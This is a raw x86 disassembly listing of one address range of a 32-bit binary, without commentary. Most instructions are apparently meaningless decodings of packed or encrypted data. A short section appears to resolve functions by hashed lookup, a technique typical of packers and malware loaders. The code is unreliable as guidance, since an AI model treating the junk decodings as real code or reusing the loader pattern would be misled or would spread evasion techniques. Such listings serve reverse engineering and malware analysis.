  41a790:	fisttp QWORD PTR [ecx+0x4e]
  41a793:	sahf   
  41a794:	loop   0x41a7cd
  41a796:	pushf  
  41a797:	cmc    
  41a798:	mov    esp,0x7c661e31
  41a79d:	adc    ebp,DWORD PTR [edi+0x24337503]
  41a7a3:	test   DWORD PTR [ecx],edx
  41a7a5:	mov    ds:0x59a6b698,eax
  41a7aa:	ret    0x1cc4
  41a7ad:	stc    
  41a7ae:	fs fwait
  41a7b0:	stos   DWORD PTR es:[edi],eax
  41a7b1:	jge    0x41a821
  41a7b3:	push   ebx
  41a7b4:	and    al,0xec
  41a7b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7b7:	and    DWORD PTR [edx],esi
  41a7b9:	push   0xabf4f8f6
  41a7be:	add    DWORD PTR [edx],edi
  41a7c0:	cld    
  41a7c1:	es mov edx,0x18029276
  41a7c7:	repz es dec edx
  41a7ca:	jae    0x41a833
  41a7cc:	aaa    
  41a7cd:	jae    0x41a81f
  41a7cf:	(bad)  
  41a7d0:	dec    esi
  41a7d1:	loop   0x41a837
  41a7d3:	stos   BYTE PTR es:[edi],al
  41a7d4:	push   0x69
  41a7d6:	shr    DWORD PTR [edx],0x6a
  41a7d9:	das    
  41a7da:	cli    
  41a7db:	std    
  41a7dc:	dec    ecx
  41a7dd:	div    ecx
  41a7df:	push   edx
  41a7e0:	popf   
  41a7e1:	jb     0x41a7c3
  41a7e3:	and    ch,BYTE PTR [edx-0x5c]
  41a7e6:	loope  0x41a7d1
  41a7e8:	loopne 0x41a7b0
  41a7ea:	inc    ecx
  41a7eb:	pop    ss
  41a7ec:	inc    eax
  41a7ed:	cmp    BYTE PTR [edi],dl
  41a7ef:	loopne 0x41a858
  41a7f1:	xchg   ebx,eax
  41a7f2:	mov    bl,0x9a
  41a7f4:	fdiv   st(0),st
  41a7f7:	jbe    0x41a857
  41a7f9:	push   edx
  41a7fa:	aas    
  41a7fb:	std    
  41a7fc:	mov    esi,0x1c80a1b0
  41a801:	daa    
  41a802:	cmp    DWORD PTR [edx-0x8],esp
  41a805:	push   ebx
  41a806:	sbb    edi,DWORD PTR [esi+0x16]
  41a809:	xlat   BYTE PTR ds:[ebx]
  41a80a:	sbb    cl,dh
  41a80c:	das    
  41a80d:	loopne 0x41a810
  41a80f:	std    
  41a810:	arpl   WORD PTR [edx+0xb],di
  41a813:	pop    edx
  41a814:	test   eax,0x4049ca6c
  41a819:	sti    
  41a81a:	jp     0x41a7be
  41a81c:	imul   edi,DWORD PTR [edx],0xffffffbe
  41a81f:	or     ecx,DWORD PTR ds:0xb3324178
  41a825:	adc    dl,BYTE PTR [edx-0xf]
  41a828:	mov    edx,0xfd1c7e7e
  41a82d:	adc    bl,BYTE PTR [eax-0x491975af]
  41a833:	sub    DWORD PTR [edi],eax
  41a835:	(bad)  
  41a836:	xlat   BYTE PTR ds:[ebx]
  41a837:	xor    eax,0xe9d81430
  41a83c:	je     0x41a80f
  41a83e:	ret    
  41a83f:	pop    edx
  41a840:	lods   eax,DWORD PTR ds:[esi]
  41a841:	inc    eax
  41a842:	dec    ebx
  41a843:	outs   dx,BYTE PTR ds:[esi]
  41a844:	adc    DWORD PTR [ecx-0x2d],esi
  41a847:	mov    bl,0xaa
  41a849:	icebp  
  41a84a:	aas    
  41a84b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a84c:	xchg   edx,eax
  41a84d:	scas   al,BYTE PTR es:[edi]
  41a84e:	add    BYTE PTR [edx-0x2a],ah
  41a851:	xor    ebx,DWORD PTR [ecx-0x9]
  41a854:	into   
  41a855:	ds ss in al,0x73
  41a859:	and    BYTE PTR [ecx+edi*2+0x25],dl
  41a85d:	scas   al,BYTE PTR es:[edi]
  41a85e:	cdq    
  41a85f:	xor    BYTE PTR [edi],al
  41a861:	push   cs
  41a862:	and    eax,0xf9ffe9ee
  41a867:	imul   edx,DWORD PTR [esi],0x31
  41a86a:	dec    ebx
  41a86b:	mov    al,0x17
  41a86d:	push   edx
  41a86e:	add    BYTE PTR [edx],ch
  41a870:	jae    0x41a8d2
  41a872:	fst    DWORD PTR [ebx+0x2b]
  41a875:	sub    ebp,DWORD PTR [ecx+0x74]
  41a878:	repnz enter 0xa8e2,0xc0
  41a87d:	xchg   ebp,eax
  41a87e:	push   esp
  41a87f:	push   edi
  41a880:	or     ebp,DWORD PTR [esi+eax*8+0x6c]
  41a884:	loopne 0x41a8e8
  41a886:	mov    cl,0xcd
  41a888:	pop    ss
  41a889:	inc    edx
  41a88a:	clc    
  41a88b:	or     BYTE PTR [esi],dl
  41a88d:	dec    ecx
  41a88e:	mov    ch,0x96
  41a890:	ja     0x41a863
  41a892:	ins    BYTE PTR es:[edi],dx
  41a893:	je     0x41a8a1
  41a895:	pop    ebx
  41a896:	and    ch,BYTE PTR [edx-0x71b773f0]
  41a89c:	adc    DWORD PTR [esi+0x57eee17f],ecx
  41a8a2:	in     eax,0x7c
  41a8a4:	sub    DWORD PTR [esi+esi*2-0x1c],esp
  41a8a8:	jnp    0x41a82b
  41a8aa:	loopne 0x41a859
  41a8ac:	lea    eax,[ecx-0x5d8385f0]
  41a8b2:	add    eax,ebx
  41a8b4:	jmp    0x41c8fd
  41a8b9:	mov    eax,DWORD PTR [ebp-0x2c]
  41a8bc:	movzx  eax,WORD PTR [eax+edi*2]
  41a8c0:	mov    ecx,DWORD PTR [ebp-0x14]
  41a8c3:	mov    eax,DWORD PTR [ecx+eax*4]
  41a8c6:	mov    DWORD PTR [ebp+0xc],eax
  41a8c9:	mov    eax,DWORD PTR [ebp-0x4]
  41a8cc:	mov    ecx,DWORD PTR [ebp-0x8]
  41a8cf:	xor    eax,0x7510850
  41a8d4:	add    eax,ebx
  41a8d6:	cmp    ecx,eax
  41a8d8:	jne    0x41a8eb
  41a8de:	mov    eax,DWORD PTR [ebp-0x4]
  41a8e1:	xor    eax,0x7510850
  41a8e6:	jmp    0x41a8b2
  41a8eb:	mov    eax,DWORD PTR [ebp+0xc]
  41a8ee:	add    eax,DWORD PTR [ebp+0x8]
  41a8f1:	mov    DWORD PTR [ebp-0x10],eax
  41a8f4:	mov    eax,DWORD PTR [ebp-0x1c]
  41a8f7:	test   eax,eax
  41a8f9:	je     0x41bfdb
  41a8ff:	mov    DWORD PTR [ebp-0x24],esi
  41a902:	push   0xb
  41a904:	jmp    0x41ab39
  41a909:	rcl    dh,1
  41a90b:	xlat   BYTE PTR ds:[ebx]
  41a90c:	int3   
  41a90d:	aad    0xd1
  41a90f:	fcmovnu st,st(2)
  41a911:	ss (bad) 
  41a913:	inc    esp
  41a914:	add    edx,0x6f
  41a917:	rcr    BYTE PTR ds:0x787fd548,0x10
  41a91e:	jle    0x41a998
  41a920:	js     0x41a979
  41a922:	push   ss
  41a923:	pusha  
  41a924:	pop    ebx
  41a925:	pop    ss
  41a926:	dec    esp
  41a927:	mov    eax,ds:0xd2d3e59f
  41a92c:	test   eax,0x79129970
  41a931:	fisubr DWORD PTR [edi+0x53]
  41a934:	pop    ss
  41a935:	cmc    
  41a936:	or     dh,0xe
  41a939:	out    dx,al
  41a93a:	jns    0x41a969
  41a93c:	outs   dx,DWORD PTR ds:[esi]
  41a93d:	sub    ah,BYTE PTR [edx-0x5e275269]
  41a943:	ret    
  41a944:	int3   
  41a945:	or     eax,0x3a8d812c
  41a94a:	aad    0x25
  41a94c:	xchg   esi,eax
  41a94d:	jge    0x41a99c
  41a94f:	cmp    ebx,edi
  41a951:	jp     0x41a96e
  41a953:	add    al,BYTE PTR [esi]
  41a955:	pop    esp
  41a956:	fsubr  DWORD PTR [esi+ecx*1-0x80]
  41a95a:	jno    0x41a94d
  41a95c:	ror    DWORD PTR ds:0xf2c3d490,cl
  41a962:	clc    
  41a963:	inc    edi
  41a964:	or     cl,bl
  41a966:	push   es
  41a967:	imul   ebx,DWORD PTR [edx],0x1133fcd5
  41a96d:	bound  edi,QWORD PTR [esi-0xe]
  41a970:	mov    dl,0xab
  41a972:	mov    WORD PTR [edx+0x61],cs
  41a975:	dec    esp
  41a976:	pop    esi
  41a977:	and    al,0xd1
  41a979:	pop    ecx
  41a97a:	out    dx,al
  41a97b:	jg     0x41a96b
  41a97d:	scas   al,BYTE PTR es:[di]
  41a97f:	(bad)  
  41a980:	imul   edx,edi,0xffffffd6
  41a983:	clc    
  41a984:	xchg   BYTE PTR [ebx],ah
  41a986:	mov    ebx,0x76031526
  41a98b:	push   esi
  41a98c:	jno    0x41a9ca
  41a98e:	add    DWORD PTR [ecx-0x7f],edx
  41a991:	cmc    
  41a992:	cld    
  41a993:	in     al,dx
  41a994:	pop    eax
  41a995:	pushf  
  41a996:	mov    ds:0x6c006f00,eax
  41a99b:	icebp  
  41a99c:	pop    ss
  41a99d:	push   0x43
  41a99f:	test   eax,0xa5b43a4a
  41a9a4:	aam    0x8e
  41a9a6:	out    dx,al
  41a9a7:	sbb    bl,BYTE PTR [ebp-0x6b3b8421]
  41a9ad:	jge    0x41a9cb
  41a9af:	mov    al,0xfb
  41a9b1:	push   ss
  41a9b2:	stos   DWORD PTR es:[edi],eax
  41a9b3:	fsub   DWORD PTR [esi+eax*2-0x3445167f]
  41a9ba:	rcr    ah,1
  41a9bc:	out    dx,al
  41a9bd:	jmp    0x41aa3c
  41a9bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9c0:	sbb    DWORD PTR [ebp-0x17],ebp
  41a9c3:	mov    dl,0x19
  41a9c5:	mov    edx,0x3f0ce788
  41a9ca:	pop    ebp
  41a9cb:	stc    
  41a9cc:	retf   0x733d
  41a9cf:	lods   al,BYTE PTR ds:[esi]
  41a9d0:	aaa    
  41a9d1:	mov    al,0x5c
  41a9d3:	outs   dx,BYTE PTR ds:[esi]
  41a9d4:	std    
  41a9d5:	push   cs
  41a9d6:	arpl   WORD PTR [edi+0x36cb4dd8],dx
  41a9dc:	xchg   ebp,eax
  41a9dd:	pop    ss
  41a9de:	or     ecx,DWORD PTR [esp+eax*2-0x2d]
  41a9e2:	mov    ds:0xc36d5e88,al
  41a9e7:	pop    edi
  41a9e8:	idiv   DWORD PTR [edi-0x78]
  41a9eb:	adc    BYTE PTR cs:0x609b496f,bl
  41a9f2:	call   0xb53c:0x1eb390e0
  41a9f9:	pop    ecx
  41a9fa:	mov    esp,0xa12d9fc1
  41a9ff:	push   ss
  41aa00:	mov    ds:0x11730055,eax
  41aa05:	std    
  41aa06:	jg     0x41aa20
  41aa08:	ins    DWORD PTR es:[edi],dx
  41aa09:	ins    DWORD PTR es:[edi],dx
  41aa0a:	xchg   esi,eax
  41aa0b:	push   eax
  41aa0c:	fisttp QWORD PTR [eax-0x15689]
  41aa12:	cmp    eax,0xb68bcefd
  41aa17:	xor    eax,DWORD PTR [ebx-0x4ac434a4]
  41aa1d:	xor    eax,0xccf78ae4
  41aa22:	pop    edx
  41aa23:	fistp  DWORD PTR [eax+0x6e052799]
  41aa29:	mov    edi,edi
  41aa2b:	dec    edx
  41aa2c:	mov    WORD PTR [ebx+0x5e],fs
  41aa2f:	ret    
  41aa30:	rcr    ah,cl
  41aa32:	dec    ecx
  41aa33:	test   eax,0x10cb13ca
  41aa38:	push   edi
  41aa39:	fimul  WORD PTR [ebp+0x4a]
  41aa3c:	sahf   
  41aa3d:	jb     0x41aa7c
  41aa3f:	retf   0xf223
  41aa42:	and    dl,BYTE PTR [ebp+0xa65591e]
  41aa48:	mov    ds:0x3fab962f,al
  41aa4d:	lds    ebp,FWORD PTR [edx]
  41aa4f:	jle    0x41aa1e
  41aa51:	out    dx,eax
  41aa52:	pop    esp
  41aa53:	pop    edi
  41aa54:	loope  0x41a9d8
  41aa56:	aas    
  41aa57:	dec    ecx
  41aa58:	xchg   esi,eax
  41aa59:	add    DWORD PTR [ebp-0x7b],ebp
  41aa5c:	jge    0x41aad4
  41aa5e:	dec    esp
  41aa5f:	xlat   BYTE PTR ds:[ebx]
  41aa60:	jmp    0x48b39331
  41aa65:	xchg   BYTE PTR [ebx+0x3fc74f93],cl
  41aa6b:	test   eax,0xfe73ca1a
  41aa70:	bound  edi,QWORD PTR [edi]
  41aa72:	xlat   BYTE PTR ds:[ebx]
  41aa73:	mov    al,0xc3
  41aa75:	mov    ds:0xc41c77f6,al
  41aa7a:	test   al,0xb0
  41aa7c:	sar    BYTE PTR [ecx],0xe1
  41aa7f:	lds    edi,FWORD PTR [ecx]
  41aa81:	jbe    0x41aacf
  41aa83:	ins    DWORD PTR es:[edi],dx
  41aa84:	jbe    0x41aa72
  41aa86:	push   ebp
  41aa87:	pop    edx
  41aa88:	rol    DWORD PTR [esi+0x8e2be4],cl
  41aa8e:	mov    al,0x5f
  41aa90:	jae    0x41aad8
  41aa92:	pop    ds
  41aa93:	scas   al,BYTE PTR es:[edi]
  41aa94:	add    BYTE PTR [esp+ecx*2-0x4ba00567],0xde
  41aa9c:	mov    ds:0xb3789e3c,al
  41aaa1:	int    0x74
  41aaa3:	mov    ch,0x6
  41aaa5:	lds    esi,FWORD PTR [ecx-0x53]
  41aaa8:	mov    esi,0x259315e6
  41aaad:	jae    0x41aaa3
  41aaaf:	jge    0x41ab05
  41aab1:	sub    ecx,edx
  41aab3:	adc    al,0xb9
  41aab5:	mov    ds:0xa9a1dfaa,al
  41aaba:	jmp    0x22a5f32e
  41aabf:	pop    ss
  41aac0:	sub    al,0x4
  41aac2:	aas    
  41aac3:	sbb    BYTE PTR ds:0x5bf00e94,ch
  41aac9:	(bad)  
  41aaca:	in     al,dx
  41aacb:	jecxz  0x41ab1e
  41aacd:	pop    ebx
  41aace:	sbb    al,0xbf
  41aad0:	popa   
  41aad1:	outs   dx,DWORD PTR ds:[esi]
  41aad2:	mov    ah,0x7c
  41aad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aad5:	xor    ebx,DWORD PTR [ebx]
  41aad7:	sub    al,0x8a
  41aad9:	das    
  41aada:	add    esp,DWORD PTR [ecx-0x64]
  41aadd:	ins    DWORD PTR es:[edi],dx
  41aade:	jnp    0x41ab54
  41aae0:	retf   0xda3
  41aae3:	sub    al,BYTE PTR [eax]
  41aae5:	add    ebx,DWORD PTR [ecx-0x3ed67093]
  41aaeb:	hlt    
  41aaec:	cmp    BYTE PTR [edx+eax*4],0x99
  41aaf0:	push   ds
  41aaf1:	adc    ecx,DWORD PTR [ebp-0x7beb2799]
  41aaf7:	mov    bl,0xd5
  41aaf9:	cli    
  41aafa:	jne    0x41ab26
  41aafc:	shl    DWORD PTR [ecx-0x4b],1
  41aaff:	jp     0x41ab37
  41ab01:	dec    ebp
  41ab02:	mov    bl,0xf4
  41ab04:	loopne 0x41ab4d
  41ab06:	mov    dl,0x9b
  41ab08:	pop    ss
  41ab09:	push   ebp
  41ab0a:	test   eax,0x88acc202
  41ab0f:	out    dx,eax
  41ab10:	jo     0x41ab7c
  41ab12:	sub    BYTE PTR [ebx*4+0x60ba2d98],dh
  41ab19:	nop
  41ab1a:	pop    ebx
  41ab1b:	push   cs
  41ab1c:	dec    edx
  41ab1d:	daa    
  41ab1e:	fcom   DWORD PTR [edi-0x37]
  41ab21:	push   0xffffffd8
  41ab23:	jle    0x41aabc
  41ab25:	inc    esi
  41ab26:	popa   
  41ab27:	dec    esp
  41ab28:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41ab2a:	test   BYTE PTR [edi-0x5b],ah
  41ab2d:	dec    edx
  41ab2e:	cmp    eax,0xaaf32b76
  41ab33:	cmp    al,0xa8
  41ab35:	jle    0x41ab29
  41ab37:	push   edi
  41ab38:	add    BYTE PTR [ecx+0x6a],bl
  41ab3b:	add    eax,0x30e95b49
  41ab40:	add    al,BYTE PTR [eax]
  41ab42:	add    dl,dl
  41ab44:	sar    DWORD PTR [edi],cl
  41ab46:	leave  
  41ab47:	cmp    eax,0x48dbdad9
  41ab4c:	pushf  
  41ab4d:	mov    eax,ds:0x16eba6be
  41ab52:	dec    esp
  41ab53:	pusha  
  41ab54:	fstp   TBYTE PTR [edi+0x78]
  41ab57:	adc    BYTE PTR [esi+0x78],bh
  41ab5a:	js     0x41aba0
  41ab5c:	jne    0x41abc7
  41ab5e:	sbb    ebp,DWORD PTR [edi+eax*4]
  41ab61:	stos   DWORD PTR es:[edi],eax
  41ab62:	bnd call 0x28445539
  41ab68:	shr    DWORD PTR [eax+0x17785029],0xb0
  41ab6f:	jmp    0x3d99:0xd6db7ff8
  41ab76:	call   0x72f7:0xb7f84f7e
  41ab7d:	cmc    
  41ab7e:	mov    ch,0x79
  41ab80:	sti    
  41ab81:	(bad)  
  41ab83:	out    0xc0,al
  41ab85:	out    dx,al
  41ab86:	cld    
  41ab87:	adc    eax,0x8887b0cd
  41ab8c:	xchg   BYTE PTR [ebp+0x4247ea91],dh
  41ab92:	ds push edx
  41ab94:	xor    eax,DWORD PTR [ebp+0x298df111]
  41ab9a:	mov    ecx,0x373d9bc3
  41ab9f:	dec    edx
  41aba0:	sbb    BYTE PTR [esi-0x1e],bl
  41aba3:	pusha  
  41aba4:	adc    esp,DWORD PTR [ebp-0x251147ea]
  41abaa:	cld    
  41abab:	xchg   edi,eax
  41abac:	add    bh,BYTE PTR [esi-0x7b1bf968]
  41abb2:	daa    
  41abb3:	leave  
  41abb4:	adc    eax,0x6e6e1a76
  41abb9:	jae    0x41ac30
  41abbb:	xchg   cl,dh
  41abbd:	sub    DWORD PTR [eax-0x357abc88],esp
  41abc3:	je     0x41ab50
  41abc5:	or     DWORD PTR [ecx+ecx*8+0xb30ba3b],esi
  41abcc:	into   
  41abcd:	mov    ebp,DWORD PTR [edi+0xa28d82e]
  41abd3:	clc    
  41abd4:	pop    ebx
  41abd5:	adc    BYTE PTR [eax+0x53305f52],al
  41abdb:	in     al,0x52
  41abdd:	push   ebp
  41abde:	(bad)  
  41abe0:	or     DWORD PTR [esi*8+0x6c733df2],ecx
  41abe7:	stos   BYTE PTR es:[edi],al
  41abe8:	fdivr  DWORD PTR [eax-0x1cb1707a]
  41abee:	and    al,BYTE PTR [edi]
  41abf0:	call   0x3fa66002
  41abf5:	pushf  
  41abf6:	pop    ebp
  41abf7:	or     al,0x4
  41abf9:	retf   0x1d28
  41abfc:	(bad)  
  41abfd:	in     eax,0x67
  41abff:	inc    edi
  41ac00:	inc    ebx
  41ac01:	cmp    cl,0x3a
  41ac04:	and    DWORD PTR [ecx-0x3c],edi
  41ac07:	or     eax,0x3abf9b9f
  41ac0c:	psraw  mm7,mm1
  41ac0f:	loopne 0x41abac
  41ac11:	xchg   ecx,eax
  41ac12:	cmp    edx,DWORD PTR [edx]
  41ac14:	cld    
  41ac15:	xor    esp,0x40
  41ac18:	adc    esi,esp
  41ac1a:	pop    es
  41ac1b:	pusha  
  41ac1c:	shl    BYTE PTR [esi+0x7d1c415],cl
  41ac22:	adc    DWORD PTR [edi+edi*2+0x2737ac42],edx
  41ac29:	fwait
  41ac2a:	cmp    eax,0xe1a02941
  41ac2f:	es sub al,0x26
  41ac32:	jl     0x41ac4e
  41ac34:	sub    ecx,esp
  41ac36:	in     eax,dx
  41ac37:	fmul   st(4),st
  41ac39:	dec    eax
  41ac3a:	shr    BYTE PTR [esi+0x3168be00],0xa3
  41ac41:	push   ss
  41ac42:	mov    ds,ebp
  41ac44:	(bad)  
  41ac45:	stc    
  41ac46:	mov    ds:0x90b152f0,eax
  41ac4b:	int3   
  41ac4c:	pop    ds
  41ac4d:	push   edi
  41ac4e:	out    0x7b,eax
  41ac50:	adc    BYTE PTR [ecx-0xd],dl
  41ac53:	fmul   DWORD PTR [eax-0x5c]
  41ac56:	push   ss
  41ac57:	add    al,BYTE PTR [ecx+ebp*4+0x5b415313]
  41ac5e:	daa    
  41ac5f:	stos   BYTE PTR es:[edi],al
  41ac60:	dec    esi
  41ac61:	loop   0x41ac43
  41ac63:	pop    ds
  41ac64:	fmul   DWORD PTR [edi]
  41ac66:	mov    ebx,0x331611ba
  41ac6b:	mov    ebp,DWORD PTR [eax-0x729350e5]
  41ac71:	pop    ecx
  41ac72:	fisub  WORD PTR [edi-0x70d66b65]
  41ac78:	fild   DWORD PTR ds:0x5cb7c3d7
  41ac7e:	stc    
  41ac7f:	rol    DWORD PTR [eax],0x2e
  41ac82:	sbb    DWORD PTR [ebx+0x6],0x2f207447
  41ac89:	hlt    
  41ac8a:	jno    0x41acdd
  41ac8c:	lock mov BYTE PTR [esi],0x9f
  41ac90:	push   DWORD PTR [ebx]
  41ac92:	sub    bh,BYTE PTR [ebx+edi*4-0x39]
  41ac96:	jns    0x41ac5a
  41ac98:	loop   0x41acff
  41ac9a:	add    DWORD PTR [edx],eax
  41ac9c:	xor    DWORD PTR [ebx-0x33],ecx
  41ac9f:	aas    
  41aca0:	xor    BYTE PTR [edx+0x55d9c0a0],cl
  41aca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aca7:	and    al,0x17
  41aca9:	mov    al,0x4c
  41acab:	add    eax,0x31426d64
  41acb0:	aam    0x6
  41acb2:	fs xchg bl,dh
  41acb5:	sbb    ebp,0xc81a0765
  41acbb:	or     bh,BYTE PTR [ebx+0x67]
  41acbe:	stc    
  41acbf:	jl     0x41acd7
  41acc1:	jne    0x41acdc
  41acc3:	lahf   
  41acc4:	inc    esp
  41acc5:	fcomp  DWORD PTR [ebx]
  41acc7:	sti    
  41acc8:	adc    eax,0x4bbee35e
  41accd:	lds    edx,FWORD PTR [ebx+0x532c37ca]
  41acd3:	sbb    DWORD PTR [edi],eax
  41acd5:	mov    dh,0x0
  41acd7:	mov    esp,0x67df81e6
  41acdc:	inc    edi
  41acdd:	mov    dl,dl
  41acdf:	out    0x74,eax
  41ace1:	jns    0x41ace4
  41ace3:	pop    ss
  41ace4:	and    esi,0x6fa331ef
  41acea:	cmp    al,BYTE PTR [ebx+eiz*8+0x3ae65e1d]
  41acf1:	sti    
  41acf2:	mov    bh,BYTE PTR [edx-0x1ef7cb35]
  41acf8:	and    al,BYTE PTR [ebp+0x69c39539]
  41acfe:	cdq    
  41acff:	(bad)  
  41ad01:	mov    bl,0x8e
  41ad03:	loop   0x41ad10
  41ad05:	push   0x61dee9b5
  41ad0a:	retf   
  41ad0b:	ja     0x41ad53
  41ad0d:	sti    
  41ad0e:	repnz shr cl,0x68
  41ad12:	ins    DWORD PTR es:[edi],dx
  41ad13:	out    dx,al
  41ad14:	data16 lea dx,[edi]
  41ad18:	cli    
  41ad19:	(bad)  
  41ad1a:	pop    edx
  41ad1b:	mov    bh,0xc9
  41ad1d:	les    esp,FWORD PTR [ecx-0x7d3b41da]
  41ad23:	out    0x7f,al
  41ad25:	aad    0xe3
  41ad27:	xlat   BYTE PTR ds:[ebx]
  41ad28:	jns    0x41ad0a
  41ad2a:	push   0xa235ad4c
  41ad2f:	retf   0xde87
  41ad32:	push   edi
  41ad33:	test   DWORD PTR [esi],ebp
  41ad35:	and    al,0xc
  41ad37:	test   BYTE PTR [ecx+0x1de2f118],0x19
  41ad3e:	push   eax
  41ad3f:	popf   
  41ad40:	xor    DWORD PTR ds:0x68b972ed,eax
  41ad46:	jg     0x41ad3b
  41ad48:	and    eax,esp
  41ad4a:	in     al,0x15
  41ad4c:	pop    ss
  41ad4d:	dec    esi
  41ad4e:	dec    eax
  41ad4f:	pop    es
  41ad50:	add    ch,BYTE PTR [ebp+ebx*1+0x5b]
  41ad54:	mov    ebp,0x9f7a28e0
  41ad59:	pop    esp
  41ad5a:	sar    edx,0xda
  41ad5d:	leave  
  41ad5e:	cwde   
  41ad5f:	repz repnz add ah,BYTE PTR ds:0x15f693bc
  41ad67:	jmp    0xa4030a5e
  41ad6c:	dec    edx
  41ad6d:	mov    eax,0xed15137e
  41ad72:	rol    BYTE PTR [edi-0x1626d435],1
  41ad78:	xor    BYTE PTR [edx],al
  41ad7a:	add    BYTE PTR [eax],al
  41ad7c:	ret    0xd1d7
  41ad7f:	aas    
  41ad80:	fxch   st(1)
  41ad82:	rcr    cl,cl
  41ad84:	mov    ds:0x56d25295,eax
  41ad89:	shl    eax,cl
  41ad8b:	sbb    edi,DWORD PTR [eax-0x28]
  41ad8e:	jg     0x41ae08
  41ad90:	adc    BYTE PTR [esi+0x78],bh
  41ad93:	js     0x41ad4c
  41ad95:	jl     0x41ad5c
  41ad97:	sbb    edi,DWORD PTR [eax-0x7f]
  41ad9a:	and    eax,0x7dcfd295
  41ad9f:	cmp    al,0x3d
  41ada1:	mov    al,0xf7
  41ada3:	retf   0xe188
  41ada6:	ja     0x41add5
  41ada8:	push   ebp
  41ada9:	xchg   DWORD PTR [ebp-0xcf8c837],ecx
  41adaf:	xchg   ecx,eax
  41adb0:	ficomp DWORD PTR [edi]
  41adb2:	cmp    esp,esp
  41adb4:	inc    edx
  41adb5:	inc    eax
  41adb6:	ror    DWORD PTR ds:0xd6beb301,1
  41adbc:	inc    ebx
  41adbd:	jnp    0x41adbf
  41adbf:	mov    eax,0x6e900eaf
  41adc4:	sbb    eax,0xa1349b96
  41adc9:	sbb    BYTE PTR [eax-0x58],dh
  41adcc:	(bad)  
  41adcd:	xchg   edx,eax
  41adce:	pop    esp
  41adcf:	bnd call 0x2cf0f61b
  41add5:	xchg   edx,eax
  41add6:	adc    DWORD PTR [edi],eax
  41add8:	xor    bl,ch
  41adda:	add    esp,DWORD PTR [edi-0x1c]
  41addd:	jge    0x41ada8
  41addf:	lock fimul WORD PTR [edx+0x6b]
  41ade3:	sub    edi,ebx
  41ade5:	in     eax,0xf2
  41ade7:	leave  
  41ade8:	call   0xa99b913a
  41aded:	mov    BYTE PTR [esi+0x487c05a2],al
  41adf3:	call   0xdebd:0x5b83580e
  41adfa:	or     eax,0xcec4aaf6
  41adff:	cmp    bl,BYTE PTR [edx]
  41ae01:	jns    0x41adc0
  41ae03:	cmp    eax,0xedabe87d
  41ae08:	loop   0x41ae29
  41ae0a:	jmp    0x41ae3b
  41ae0c:	pop    es
  41ae0d:	xor    DWORD PTR es:[eax+0x2],esp
  41ae11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae12:	pop    ecx
  41ae13:	int3   
  41ae14:	mov    ebp,0x1e608b2c
  41ae19:	and    ebp,ebx
  41ae1b:	xor    eax,0x52ad9707
  41ae20:	inc    esi
  41ae21:	stos   BYTE PTR es:[edi],al
  41ae22:	scas   eax,DWORD PTR es:[edi]
  41ae23:	(bad)  
  41ae24:	mov    bh,0xd0
  41ae26:	xchg   esi,eax
  41ae27:	lock and DWORD PTR [esi],ebp
  41ae2a:	mov    al,ds:0x8f1a9fda
  41ae2f:	or     DWORD PTR [ecx-0x47495ed4],edx
  41ae35:	inc    ebx
  41ae36:	pop    esi
  41ae37:	out    0xfa,al
  41ae39:	mov    cl,0x57
  41ae3b:	adc    dl,0xbf
  41ae3e:	or     edi,DWORD PTR ds:0xa45a2a20
  41ae44:	xchg   esi,eax
  41ae45:	inc    ebx
  41ae46:	mov    ss:0x10f05fda,al
  41ae4c:	jge    0x41ae3c
  41ae4e:	push   0xffffff96
  41ae50:	xchg   DWORD PTR [ecx],ebp
  41ae52:	mov    dh,BYTE PTR [edx-0x39]
  41ae55:	ret    
  41ae56:	xor    cl,BYTE PTR [esi]
  41ae58:	jns    0x41ae34
  41ae5a:	je     0x41ae97
  41ae5c:	stos   BYTE PTR es:[edi],al
  41ae5d:	call   0xb731:0x25790b2f
  41ae64:	jmp    0xc9aa8d02
  41ae69:	jmp    0x19a:0x391c6e69
  41ae70:	jp     0x41aec3
  41ae72:	sub    ch,BYTE PTR [eax+0x4c2d2965]
  41ae78:	ins    BYTE PTR es:[edi],dx
  41ae79:	sub    bh,ah
  41ae7b:	jp     0x41aeef
  41ae7d:	call   0x5915:0x26811745
  41ae84:	mov    ds:0xf548e78b,eax
  41ae89:	popf   
  41ae8a:	int    0x64
  41ae8c:	je     0x41ae5f
  41ae8e:	lods   al,BYTE PTR ds:[esi]
  41ae8f:	retf   
  41ae90:	jnp    0x41ae4a
  41ae92:	or     al,0x65
  41ae94:	dec    edi
  41ae95:	dec    ebp
  41ae96:	retf   
  41ae97:	sbb    BYTE PTR [edx+0xdcb52c1],dh
  41ae9d:	or     eax,0xea05598d
  41aea2:	(bad)  
  41aea3:	scas   al,BYTE PTR es:[di]
  41aea5:	les    edx,FWORD PTR [esi+ebx*2+0x3d]
  41aea9:	popf   
  41aeaa:	lods   al,BYTE PTR ds:[esi]
  41aeab:	and    dh,BYTE PTR [esi]
  41aead:	mov    bl,0x40
  41aeaf:	sub    DWORD PTR [ebx-0x72b7f1db],0x7148e8c6
  41aeb9:	ja     0x41ae78
  41aebb:	stc    
  41aebc:	add    edx,DWORD PTR [edi]
  41aebe:	test   BYTE PTR [edi+0x69],cl
  41aec1:	mov    ds:0xb9b910d1,eax
  41aec6:	test   eax,0xb29ccced
  41aecb:	mov    ah,0x8c
  41aecd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aece:	xchg   edx,eax
  41aecf:	or     DWORD PTR [edi+0x25],edx
  41aed2:	or     ch,dh
  41aed4:	push   es
  41aed5:	retf   0x386
  41aed8:	ss sar al,cl
  41aedb:	imul   esp,DWORD PTR [edi+0xb],0xffffffb3
  41aedf:	pop    ebx
  41aee0:	sub    BYTE PTR [edi-0x2c],ah
  41aee3:	mov    dh,0xe7
  41aee5:	adc    BYTE PTR [ecx],bh
  41aee7:	bound  ecx,QWORD PTR [edx-0x36]
  41aeea:	dec    ebp
  41aeeb:	cmp    BYTE PTR [edx+0x4d],bl
  41aeee:	js     0x41af35
  41aef0:	jbe    0x41aef5
  41aef2:	lea    ecx,[edx-0xd]
  41aef5:	lea    edi,[ebp-0x799ae7d8]
  41aefb:	xor    al,0x97
  41aefd:	out    dx,al
  41aefe:	pop    esp
